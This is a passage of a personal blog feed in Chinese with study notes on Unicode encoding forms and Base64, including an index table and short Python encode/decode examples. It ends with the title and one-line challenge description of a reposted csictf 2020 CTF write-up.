href="https://zh.wikipedia.org/w/index.php?title=%E5%88%A9%E8%A5%BF%E4%BA%9A%E6%96%87&amp;action=edit&amp;redlink=1">利西亚文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E5%90%95%E5%BA%95%E4%BA%9A%E6%96%87&amp;action=edit&amp;redlink=1">吕底亚文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E6%A1%91%E5%A1%94%E5%88%A9%E6%96%87&amp;action=edit&amp;redlink=1">桑塔利文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E6%8B%89%E8%AE%A9%E6%96%87&amp;action=edit&amp;redlink=1">拉让文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E7%B4%A2%E6%8B%89%E4%BB%80%E7%89%B9%E6%8B%89%E6%96%87&amp;action=edit&amp;redlink=1">索拉什特拉文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E5%B7%BD%E4%BB%96%E6%96%87&amp;action=edit&amp;redlink=1">巽他文</a>、<a href="https://zh.wikipedia.org/w/index.php?title=%E7%93%A6%E4%BC%8A%E6%96%87&amp;action=edit&amp;redlink=1">瓦伊文</a>、<a href="https://zh.wikipedia.org/wiki/%E6%96%90%E6%96%AF%E6%89%98%E6%96%AF%E5%9C%93%E7%9B%A4">斐斯托斯圆盘</a>，<a href="https://zh.wikipedia.org/wiki/%E9%BA%BB%E5%B0%86">麻将</a>、<a href="https://zh.wikipedia.org/wiki/%E5%A4%9A%E7%B1%B3%E8%AF%BA%E9%AA%A8%E7%89%8C">多米诺骨牌</a>上的符号、<a href="https://zh.wikipedia.org/w/index.php?title=%E9%98%BF%E7%BB%B4%E6%96%AF%E9%99%80%E6%96%87&amp;action=edit&amp;redlink=1">阿维斯陀文</a>，<a href="https://zh.wikipedia.org/wiki/%E5%B7%B4%E5%A7%86%E7%A9%86%E6%96%87%E5%AD%97">巴姆穆文字</a>，<a href="https://zh.wikipedia.org/wiki/%E5%9F%83%E5%8F%8A%E8%B1%A1%E5%BD%A2%E6%96%87%E5%AD%97">埃及象形文字</a> （<a href="https://zh.wikipedia.org/wiki/%E5%8A%A0%E6%B1%80%E7%B4%8D%E7%AC%A6%E8%99%9F%E8%A1%A8">加汀纳符号表</a>，涵盖1071个符号），<a href="https://zh.wikipedia.org/wiki/%E4%BA%9E%E6%8B%89%E5%A7%86%E6%96%87">亚拉姆文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E5%B7%B4%E6%8B%89%E7%BB%B4%E7%A2%91%E9%93%AD%E4%BD%93&amp;action=edit&amp;redlink=1">巴拉维碑铭体</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E5%B8%95%E6%8F%90%E4%BA%9A%E7%A2%91%E9%93%AD%E4%BD%93&amp;action=edit&amp;redlink=1">帕提亚碑铭体</a>，<a href="https://zh.wikipedia.org/wiki/%E7%88%AA%E5%93%87%E6%96%87">爪哇文</a>，<a href="https://zh.wikipedia.org/wiki/%E5%87%B1%E6%8F%90%E6%96%87">凯提文</a>，<a href="https://zh.wikipedia.org/wiki/%E8%80%81%E5%82%88%E5%83%B3%E6%96%87">老傈僳文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E6%9B%BC%E5%B0%BC%E6%99%AE%E5%B0%94%E6%96%87&amp;action=edit&amp;redlink=1">曼尼普尔文</a>，<a href="https://zh.wikipedia.org/wiki/%E5%8D%97%E9%98%BF%E6%8B%89%E4%BC%AF%E5%AD%97%E6%AF%8D">南阿拉伯字母</a>，<a href="https://zh.wikipedia.org/wiki/%E5%8F%A4%E7%AA%81%E5%8E%A5%E6%96%87">古突厥文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E6%92%92%E7%8E%9B%E5%88%A9%E4%BA%9A%E5%AD%97%E6%AF%8D&amp;action=edit&amp;redlink=1">撒玛利亚字母</a>，<a href="https://zh.wikipedia.org/wiki/%E8%80%81%E5%82%A3%E6%96%87">老傣文</a>、<a href="https://zh.wikipedia.org/wiki/%E5%82%A3%E9%BB%AF%E8%AA%9E">傣越文</a>。、<a href="https://zh.wikipedia.org/w/index.php?title=%E5%B7%B4%E5%A1%94%E5%85%8B%E5%AD%97%E6%AF%8D&amp;action=edit&amp;redlink=1">巴塔克字母</a>，<a href="https://zh.wikipedia.org/wiki/%E5%A9%86%E7%BD%97%E7%B1%B3%E6%96%87%E5%AD%97">婆罗米文字</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E6%9B%BC%E8%BE%BE%E5%AD%97%E6%AF%8D&amp;action=edit&amp;redlink=1">曼达字母</a>，<a href="https://zh.wikipedia.org/wiki/%E7%BA%B8%E7%89%8C">纸牌</a>符号，<a href="https://zh.wikipedia.org/wiki/%E4%BA%A4%E9%80%9A%E6%A0%87%E5%BF%97">交通标志</a>，<a href="https://zh.wikipedia.org/wiki/%E5%9C%B0%E5%9B%BE">地图</a>符号，<a href="https://zh.wikipedia.org/w/index.php?title=%E7%82%BC%E9%87%91%E6%9C%AF%E7%AC%A6%E5%8F%B7&amp;action=edit&amp;redlink=1">炼金术符号</a>，<a href="https://zh.wikipedia.org/wiki/%E9%A2%9C%E6%96%87%E5%AD%97">颜文字</a>、<a href="https://zh.wikipedia.org/wiki/%E7%BB%98%E6%96%87%E5%AD%97">绘文字</a>、<a href="https://zh.wikipedia.org/w/index.php?title=%E6%9F%A5%E5%85%8B%E9%A9%AC%E5%AD%97%E6%AF%8D&amp;action=edit&amp;redlink=1">查克马字母</a>，<a href="https://zh.wikipedia.org/wiki/%E9%BA%A6%E7%BD%97%E5%9F%83%E6%96%87">麦罗埃文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E9%BA%A6%E7%BD%97%E5%9F%83%E8%B1%A1%E5%BD%A2%E6%96%87%E5%AD%97&amp;action=edit&amp;redlink=1">麦罗埃象形文字</a>，<a href="https://zh.wikipedia.org/wiki/%E6%9F%8F%E6%A0%BC%E7%90%86%E8%8B%97%E6%96%87">柏格理苗文</a>，<a href="https://zh.wikipedia.org/wiki/%E5%A4%8F%E6%8B%89%E9%81%94%E6%96%87">夏拉达文</a>，<a href="https://zh.wikipedia.org/wiki/%E7%B4%A2%E6%8B%89%E5%83%A7%E5%B9%B3%E6%96%87%E5%AD%97">索拉僧平文字</a>、<a href="https://zh.wikipedia.org/w/index.php?title=%E6%B3%B0%E5%85%8B%E9%87%8C%E6%96%87&amp;action=edit&amp;redlink=1">泰克里文</a>、<a href="https://zh.wikipedia.org/wiki/%E5%9C%9F%E8%80%B3%E5%85%B6%E9%87%8C%E6%8B%89%E7%AC%A6%E5%8F%B7">土耳其里拉符号</a>、5个双向排版符号、<a href="https://zh.wikipedia.org/w/index.php?title=%E5%B7%B4%E8%90%A8%E5%AD%97%E6%AF%8D&amp;action=edit&amp;redlink=1">巴萨字母</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E9%AB%98%E5%8A%A0%E7%B4%A2%E9%98%BF%E5%B0%94%E5%B7%B4%E5%B0%BC%E4%BA%9A%E5%AD%97%E6%AF%8D&amp;action=edit&amp;redlink=1">高加索阿尔巴尼亚字母</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E6%9D%9C%E6%99%AE%E9%9B%B7%E5%9A%B4%E9%80%9F%E8%A8%98&amp;action=edit&amp;redlink=1">杜普雷严速记</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E7%88%B1%E5%B0%94%E5%B7%B4%E6%A1%91%E5%AD%97%E6%AF%8D&amp;action=edit&amp;redlink=1">爱尔巴桑字母</a>，<a href="https://zh.wikipedia.org/wiki/%E5%8F%A4%E5%85%B0%E5%A1%94%E6%96%87">古兰塔文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E5%8F%AF%E5%90%89%E6%96%87&amp;action=edit&amp;redlink=1">可吉文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E5%BA%93%E8%BE%BE%E7%93%A6%E8%BF%AA%E6%96%87&amp;action=edit&amp;redlink=1">库达瓦迪文</a>，<a href="https://zh.wikipedia.org/wiki/%E7%BA%BF%E5%BD%A2%E6%96%87%E5%AD%97A">线形文字A</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E9%A9%AC%E5%93%88%E4%BD%B3%E5%B0%BC%E6%96%87&amp;action=edit&amp;redlink=1">马哈佳尼文</a>，<a href="https://zh.wikipedia.org/wiki/%E6%91%A9%E5%B0%BC%E6%95%99%E5%AD%97%E6%AF%8D">摩尼教字母</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E9%97%A8%E5%BE%97%E6%96%87%E5%AD%97&amp;action=edit&amp;redlink=1">门得文字</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E8%8E%AB%E8%BF%AA%E5%AD%97%E6%AF%8D&amp;action=edit&amp;redlink=1">莫迪字母</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E9%BB%98%E6%96%87&amp;action=edit&amp;redlink=1">默文</a>，<a href="https://zh.wikipedia.org/wiki/%E7%B4%8D%E5%B7%B4%E6%B3%B0%E5%AD%97%E6%AF%8D">纳巴泰字母</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E5%8F%A4%E5%8C%97%E9%98%BF%E6%8B%89%E4%BC%AF%E6%96%87&amp;action=edit&amp;redlink=1">古北阿拉伯文</a>，<a href="https://zh.wikipedia.org/wiki/%E5%8F%A4%E5%BD%BC%E7%88%BE%E5%A7%86%E6%96%87">古彼尔姆文</a>，<a href="https://zh.wikipedia.org/wiki/%E6%9D%A8%E6%9D%BE%E5%BD%95%E8%8B%97%E6%96%87">杨松录苗文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E5%B8%95%E7%B1%B3%E6%8B%89%E6%96%87%E5%AD%97&amp;action=edit&amp;redlink=1">帕米拉文字</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E8%A2%8D%E6%B8%85%E8%B1%AA%E6%96%87&amp;action=edit&amp;redlink=1">袍清豪文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E8%AF%97%E7%AF%87%E5%B7%B4%E5%88%97%E7%BB%B4%E6%96%87&amp;action=edit&amp;redlink=1">诗篇巴列维文</a>，<a href="https://zh.wikipedia.org/wiki/%E6%82%89%E6%9B%87%E6%96%87%E5%AD%97">悉昙文字</a>，<a href="https://zh.wikipedia.org/wiki/%E5%BA%95%E7%BD%97%E4%BB%86%E5%A4%9A%E6%96%87">底罗仆多文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E7%93%A6%E5%85%B0%E9%BD%90%E5%9C%B0%E6%96%87&amp;action=edit&amp;redlink=1">瓦兰齐地文</a>、<a href="https://zh.wikipedia.org/wiki/Dingbat">装饰符号</a>、<a href="https://zh.wikipedia.org/wiki/%E9%98%BF%E6%B4%AA%E5%A7%86%E6%96%87">阿洪姆文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E5%AE%89%E7%BA%B3%E6%89%98%E5%88%A9%E4%BA%9A%E8%B1%A1%E5%BD%A2%E6%96%87%E5%AD%97&amp;action=edit&amp;redlink=1">安纳托利亚象形文字</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E5%93%88%E5%9D%A6%E6%96%87&amp;action=edit&amp;redlink=1">哈坦文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E7%A9%86%E5%B0%94%E5%A1%94%E5%B0%BC%E6%96%87&amp;action=edit&amp;redlink=1">穆尔塔尼文</a>，<a href="https://zh.wikipedia.org/wiki/%E5%8F%A4%E5%8C%88%E7%89%99%E5%88%A9%E5%AD%97%E6%AF%8D">古匈牙利字母</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E4%B9%A6%E5%86%99%E7%AC%A6%E5%8F%B7&amp;action=edit&amp;redlink=1">书写符号</a>、<a href="https://zh.wikipedia.org/wiki/%E5%88%87%E7%BD%97%E5%9F%BA%E6%96%87">切罗基文</a>小写字母，以及五种<a href="https://zh.wikipedia.org/wiki/%E7%BB%98%E6%96%87%E5%AD%97">绘文字</a><a href="https://zh.wikipedia.org/wiki/%E8%86%9A%E8%89%B2">肤色</a>修改字符、<a href="https://zh.wikipedia.org/w/index.php?title=%E9%98%BF%E5%BE%B7%E6%8B%89%E5%A7%86%E5%AD%97%E6%AF%8D&amp;action=edit&amp;redlink=1">阿德拉姆字母</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E6%AF%94%E5%A5%87%E8%88%92%E5%A5%87%E6%96%87&amp;action=edit&amp;redlink=1">比奇舒奇文</a>，<a href="https://zh.wikipedia.org/wiki/%E8%B1%A1%E9%9B%84%E6%96%87">象雄文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E5%B0%BC%E6%B3%8A%E5%B0%94%E7%BA%BD%E7%93%A6%E5%AD%97%E6%AF%8D&amp;action=edit&amp;redlink=1">尼泊尔纽瓦字母</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E6%AC%A7%E5%A1%9E%E5%A5%87%E5%AD%97%E6%AF%8D&amp;action=edit&amp;redlink=1">欧塞奇字母</a>，<a href="https://zh.wikipedia.org/wiki/%E8%A5%BF%E5%A4%8F%E6%96%87">西夏文</a>、绘字文、<a href="https://zh.wikipedia.org/wiki/%E8%92%99%E5%8F%A4%E6%96%87%E5%AD%97">札那巴札尔</a>、<a href="https://zh.wikipedia.org/wiki/%E7%B4%A2%E6%B0%B8%E5%B8%83%E6%96%87%E5%AD%97">索永布文字</a>、<a href="https://zh.wikipedia.org/w/index.php?title=%E9%A9%AC%E8%90%A8%E6%8B%89%E5%A7%86%E8%B4%A1%E5%BE%B7%E6%96%87%E5%AD%97&amp;action=edit&amp;redlink=1">马萨拉姆贡德文字</a>、<a href="https://zh.wikipedia.org/wiki/%E5%A5%B3%E4%B9%A6">女书</a>、<a href="https://zh.wikipedia.org/wiki/%E8%AE%8A%E9%AB%94%E5%81%87%E5%90%8D">变体假名</a>（非标准<a href="https://zh.wikipedia.org/wiki/%E5%B9%B3%E5%81%87%E5%90%8D">平假名</a>）、<a href="https://zh.wikipedia.org/w/index.php?title=%E5%A4%9A%E6%A0%BC%E6%8B%89%E6%96%87&amp;action=edit&amp;redlink=1">多格拉文</a>、<a href="https://zh.wikipedia.org/wiki/%E5%96%AC%E6%B2%BB%E4%BA%9E%E6%96%87">格鲁吉亚文</a>骑士体大写字母、<a href="https://zh.wikipedia.org/w/index.php?title=%E8%B4%A1%E8%B4%BE%E6%8B%89%E8%B4%A1%E5%BE%B7%E6%96%87&amp;action=edit&amp;redlink=1">贡贾拉贡德文</a>、<a href="https://zh.wikipedia.org/wiki/%E5%93%88%E4%B9%83%E6%96%90%E7%BE%85%E8%88%88%E4%BA%9E%E6%96%87%E5%AD%97">哈乃斐罗兴亚文字</a>、<a href="https://zh.wikipedia.org/w/index.php?title=%E6%9C%9B%E5%8A%A0%E9%94%A1%E6%96%87&amp;action=edit&amp;redlink=1">望加锡文</a>、<a href="https://zh.wikipedia.org/w/index.php?title=%E6%A2%85%E5%BE%B7%E6%B3%95%E4%BC%8A%E5%BE%B7%E6%9E%97%E6%96%87&amp;action=edit&amp;redlink=1">梅德法伊德林文</a>、<a href="https://zh.wikipedia.org/wiki/%E8%80%81%E7%B2%9F%E7%89%B9%E6%96%87">老粟特文</a>、<a href="https://zh.wikipedia.org/wiki/%E7%B2%9F%E7%89%B9%E6%96%87">粟特文</a>、<a href="https://zh.wikipedia.org/wiki/%E5%9F%83%E5%88%A9%E9%82%81%E6%96%87">埃利迈文</a>、<a href="https://zh.wikipedia.org/w/index.php?title=%E5%8D%97%E8%BF%AA%E5%9F%8E%E6%96%87&amp;action=edit&amp;redlink=1">南迪城文</a>、<a href="https://zh.wikipedia.org/wiki/%E5%89%B5%E4%B8%96%E7%B4%80%E8%8B%97%E6%96%87">创世纪苗文</a>、<a href="https://zh.wikipedia.org/w/index.php?title=%E6%96%87%E4%B9%94%E6%96%87&amp;action=edit&amp;redlink=1">文乔文</a>、<a href="https://zh.wikipedia.org/wiki/%E8%8A%B1%E5%89%8C%E5%AD%90%E6%A8%A1%E8%AF%AD">花剌子模语</a>、<a href="https://zh.wikipedia.org/wiki/%E8%BF%AA%E7%BB%B4%E8%A5%BF%E8%AF%AD">迪维西语</a>的<a href="https://zh.wikipedia.org/w/index.php?title=%E5%B3%B6%E5%AD%97%E6%AF%8D&amp;action=edit&amp;redlink=1">岛字母</a>、<a href="https://zh.wikipedia.org/wiki/%E5%A5%91%E4%B8%B9%E5%B0%8F%E5%AD%97">契丹小字</a>、<a href="https://zh.wikipedia.org/wiki/%E5%BA%93%E5%B0%94%E5%BE%B7%E8%AF%AD%E5%AD%97%E6%AF%8D">库尔德语字母</a>的<a href="https://zh.wikipedia.org/wiki/%E5%BA%93%E5%B0%94%E5%BE%B7%E8%AF%AD%E5%AD%97%E6%AF%8D">Yezidi体</a>、书写<a href="https://zh.wikipedia.org/wiki/%E8%B1%AA%E8%90%A8%E8%AF%AD">豪萨语</a>用的阿拉伯附加字母、<a href="https://zh.wikipedia.org/wiki/%E6%B2%83%E6%B4%9B%E5%A4%AB%E8%AA%9E">沃洛夫语</a>、其他非洲语言、在巴基斯坦书写<a href="https://zh.wikipedia.org/w/index.php?title=%E5%8D%B0%E5%BE%B7%E7%A7%91%E8%AA%9E&amp;action=edit&amp;redlink=1">印德科语</a>和<a href="https://zh.wikipedia.org/wiki/%E6%97%81%E9%81%AE%E6%99%AE%E8%AA%9E">旁遮普语</a>的补充字符、<a href="https://zh.wikipedia.org/wiki/%E7%B2%B5%E8%AA%9E">粤语</a>用的<a href="https://zh.wikipedia.org/wiki/%E7%B2%B5%E8%AA%9E%E6%B3%A8%E9%9F%B3%E7%AC%A6%E8%99%9F">注音符号</a>、<a href="https://zh.wikipedia.org/wiki/%E5%85%B1%E4%BA%AB%E5%89%B5%E6%84%8F">共享创意</a>授权符号、七十或八十年代电讯用图符。</p>
<h3 id="unicode编码系统可分为编码方式和实现方式两个层次">Unicode编码系统可分为编码方式和实现方式两个层次。</h3>
<p>目前实际应用的统一码版本对应于<a href="https://zh.wikipedia.org/wiki/UCS-2">UCS-2</a>，使用16<a href="https://zh.wikipedia.org/wiki/%E4%BD%8D%E5%85%83">位</a>的编码空间。也就是每个字符占用2个<a href="https://zh.wikipedia.org/wiki/%E5%AD%97%E8%8A%82">字节</a>。这样理论上一共最多可以表示216（即65536）个字符。基本满足各种语言的使用。<br>
UCS-4是一个更大的尚未填充完全的31位字符集，加上恒为0的首位，共需占据32位，即4字节。理论上最多能表示231个字符，完全可以涵盖一切语言所用的符号。<br>
基本多文种平面的字符的编码为<em>U+hhhh</em>，其中每个<em>h</em>代表一个<a href="https://zh.wikipedia.org/wiki/%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6">十六进制</a>数字，与UCS-2编码完全相同。而其对应的4字节UCS-4编码后两个字节一致，前两个字节则所有位均为0。<br>
Unicode的实现方式不同于编码方式。一个字符的Unicode编码是确定的。但是在实际传输过程中，由于不同<a href="https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E5%B9%B3%E5%8F%B0">系统平台</a>的设计不一定一致，以及出于节省空间的目的，对Unicode编码的实现方式有所不同。Unicode的实现方式称为<strong>Unicod转换格式</strong>（Unicode Transformation Format，简称为UTF）。</p>
<p><a href="https://zh.wikipedia.org/wiki/Unicode">Unicode_wiki百科</a></p>
<h2 id="base64">base64</h2>
<p><strong>Base64</strong>是一种基于64个可打印字符来表示<a href="https://zh.wikipedia.org/wiki/%E4%BA%8C%E8%BF%9B%E5%88%B6">二进制数据</a>的表示方法。由于{\displaystyle \log _{2}64=6}<img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/9c986fbdc6c036a937e0647d7a6ec5ad745bccab" alt="{\displaystyle \log _{2}64=6}" loading="lazy">，所以每6个<a href="https://zh.wikipedia.org/wiki/%E4%BD%8D%E5%85%83">比特</a>为一个单元，Base64常用于在通常处理文本<a href="https://zh.wikipedia.org/wiki/%E6%95%B0%E6%8D%AE">数据</a>的场合，表示、传输、存储一些二进制数据，包括<a href="https://zh.wikipedia.org/wiki/MIME">MIME</a>的<a href="https://zh.wikipedia.org/wiki/%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6">电子邮件</a>及<a href="https://zh.wikipedia.org/wiki/XML">XML</a>的一些复杂数据。</p>
<ul>
<li>编码“Man”</li>
</ul>
<table>
<thead>
<tr>
<th style="text-align:center">文本</th>
<th>M</th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
<th>A</th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
<th>N</th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">ASCII编码</td>
<td>77</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>97</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>110</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">二进制位</td>
<td>0</td>
<td>1</td>
<td>0</td>
<td>0</td>
<td>1</td>
<td>1</td>
<td>0</td>
<td>1</td>
<td>0</td>
<td>1</td>
<td>1</td>
<td>0</td>
<td>0</td>
<td>0</td>
<td>0</td>
<td>1</td>
<td>0</td>
<td>1</td>
<td>1</td>
<td>0</td>
<td>1</td>
<td>1</td>
<td>1</td>
<td>0</td>
</tr>
<tr>
<td style="text-align:center">索引</td>
<td>19</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>22</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>5</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>46</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">Base64编码</td>
<td><strong>T</strong></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>W</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>F</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>u</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<p>在此例中，Base64算法将3个字节编码为4个字符。</p>
<p>Base64索引表：</p>
<table>
<thead>
<tr>
<th style="text-align:center">数值</th>
<th style="text-align:center">字符</th>
<th style="text-align:center"></th>
<th style="text-align:center">数值</th>
<th style="text-align:center">字符</th>
<th style="text-align:center"></th>
<th style="text-align:center">数值</th>
<th style="text-align:center">字符</th>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">0</td>
<td style="text-align:center">A</td>
<td style="text-align:center">16</td>
<td style="text-align:center">Q</td>
<td style="text-align:center">32</td>
<td style="text-align:center">g</td>
<td style="text-align:center">48</td>
<td style="text-align:center">w</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">1</td>
<td style="text-align:center">B</td>
<td style="text-align:center">17</td>
<td style="text-align:center">R</td>
<td style="text-align:center">33</td>
<td style="text-align:center">h</td>
<td style="text-align:center">49</td>
<td style="text-align:center">x</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:center">C</td>
<td style="text-align:center">18</td>
<td style="text-align:center">S</td>
<td style="text-align:center">34</td>
<td style="text-align:center">i</td>
<td style="text-align:center">50</td>
<td style="text-align:center">y</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">3</td>
<td style="text-align:center">D</td>
<td style="text-align:center">19</td>
<td style="text-align:center">T</td>
<td style="text-align:center">35</td>
<td style="text-align:center">j</td>
<td style="text-align:center">51</td>
<td style="text-align:center">z</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">4</td>
<td style="text-align:center">E</td>
<td style="text-align:center">20</td>
<td style="text-align:center">U</td>
<td style="text-align:center">36</td>
<td style="text-align:center">k</td>
<td style="text-align:center">52</td>
<td style="text-align:center">0</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">5</td>
<td style="text-align:center">F</td>
<td style="text-align:center">21</td>
<td style="text-align:center">V</td>
<td style="text-align:center">37</td>
<td style="text-align:center">l</td>
<td style="text-align:center">53</td>
<td style="text-align:center">1</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">6</td>
<td style="text-align:center">G</td>
<td style="text-align:center">22</td>
<td style="text-align:center">W</td>
<td style="text-align:center">38</td>
<td style="text-align:center">m</td>
<td style="text-align:center">54</td>
<td style="text-align:center">2</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">7</td>
<td style="text-align:center">H</td>
<td style="text-align:center">23</td>
<td style="text-align:center">X</td>
<td style="text-align:center">39</td>
<td style="text-align:center">n</td>
<td style="text-align:center">55</td>
<td style="text-align:center">3</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">8</td>
<td style="text-align:center">I</td>
<td style="text-align:center">24</td>
<td style="text-align:center">Y</td>
<td style="text-align:center">40</td>
<td style="text-align:center">o</td>
<td style="text-align:center">56</td>
<td style="text-align:center">4</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">9</td>
<td style="text-align:center">J</td>
<td style="text-align:center">25</td>
<td style="text-align:center">Z</td>
<td style="text-align:center">41</td>
<td style="text-align:center">p</td>
<td style="text-align:center">57</td>
<td style="text-align:center">5</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">10</td>
<td style="text-align:center">K</td>
<td style="text-align:center">26</td>
<td style="text-align:center">a</td>
<td style="text-align:center">42</td>
<td style="text-align:center">q</td>
<td style="text-align:center">58</td>
<td style="text-align:center">6</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">11</td>
<td style="text-align:center">L</td>
<td style="text-align:center">27</td>
<td style="text-align:center">b</td>
<td style="text-align:center">43</td>
<td style="text-align:center">r</td>
<td style="text-align:center">59</td>
<td style="text-align:center">7</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">12</td>
<td style="text-align:center">M</td>
<td style="text-align:center">28</td>
<td style="text-align:center">c</td>
<td style="text-align:center">44</td>
<td style="text-align:center">s</td>
<td style="text-align:center">60</td>
<td style="text-align:center">8</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">13</td>
<td style="text-align:center">N</td>
<td style="text-align:center">29</td>
<td style="text-align:center">d</td>
<td style="text-align:center">45</td>
<td style="text-align:center">t</td>
<td style="text-align:center">61</td>
<td style="text-align:center">9</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">14</td>
<td style="text-align:center">O</td>
<td style="text-align:center">30</td>
<td style="text-align:center">e</td>
<td style="text-align:center">46</td>
<td style="text-align:center">u</td>
<td style="text-align:center">62</td>
<td style="text-align:center">+</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">15</td>
<td style="text-align:center">P</td>
<td style="text-align:center">31</td>
<td style="text-align:center">f</td>
<td style="text-align:center">47</td>
<td style="text-align:center">v</td>
<td style="text-align:center">63</td>
<td style="text-align:center">/</td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<p>大致过程：先将文本转为ascii码，再转为8位2进制数，再取其中6位得出对应的十进制数，再通过索引表中转换为字符</p>
<p>如果要编码的字节数不能被3整除，最后会多出1个或2个字节，那么可以使用下面的方法进行处理：先使用0字节值在末尾补足，使其能够被3整除，然后再进行Base64的编码。在编码后的Base64文本后加上一个或两个<code>=</code>号，代表补足的字节数。说，当最后剩余两个八位(待补足)字节（2个byte）时，最后一个6位的Base64字节块有四位是0值，最后附加上两个等号；如果最后剩余一个八位(待补足)字节（1个byte）时，最后一个6位的base字节块有两位是0值，最后附加一个等号。</p>
<h3 id="base64解码">base64解码</h3>
<p><a href="http://tool.chinaz.com/Tools/Base64.aspx">在线解码编码网站</a></p>
<h3 id="base64_python">base64_python</h3>
<h4 id="想将字符串转编码成base64要先将字符串转换成二进制数据">想将字符串转编码成base64,要先将字符串转换成二进制数据</h4>
<pre><code>url = &quot;https://www.cnblogs.com/songzhixue/&quot;
bytes_url = url.encode(&quot;utf-8&quot;)
str_url = base64.b64encode(bytes_url)  # 被编码的参数必须是二进制数据
print(str_url)

b'aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc29uZ3poaXh1ZS8='
</code></pre>
<h4 id="将base64解码成字符串">将base64解码成字符串</h4>
<pre><code>import base64
url = &quot;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc29uZ3poaXh1ZS8=&quot;
str_url = base64.b64decode(url).decode(&quot;utf-8&quot;)
print(str_url)

'https://www.cnblogs.com/songzhixue/'
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Scrambled Eggs (csictf 2020) 转载！！]]></title>
        <id>https://7usai.github.io/post/scrambled-eggs-csictf-2020-zhuan-zai/</id>
        <link href="https://7usai.github.io/post/scrambled-eggs-csictf-2020-zhuan-zai/">
        </link>
        <updated>2020-09-09T15:40:51.000Z</updated>
        <content type="html"><![CDATA[<h1 id="scrambled-eggs-csictf-2020-转载自httpsctftimeorg">Scrambled Eggs (csictf 2020) 转载自https://ctftime.org/</h1>
<h2 id="转载-用于个人学习">转载！！！ 用于个人学习</h2>
<h2 id="challenge-description">Challenge description</h2>
<blockquote>
<p>I like my eggs sunny side up, but I ended up scrambling them.</p>
</blockquote>
